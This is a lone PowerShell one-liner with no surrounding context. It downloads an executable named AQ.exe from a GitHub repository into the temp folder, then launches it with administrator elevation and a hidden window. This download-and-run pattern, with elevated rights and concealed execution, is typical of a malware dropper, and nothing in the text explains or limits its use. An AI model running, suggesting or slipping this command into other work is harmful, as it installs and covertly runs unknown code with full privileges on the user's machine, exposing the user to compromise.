powershell -c "irm https://github.com/cctv-security/AQ/raw/main/AQ.exe -OutFile %temp%\AQ.exe; Start-Process -Verb RunAs -WindowStyle Hidden %temp%\AQ.exe"

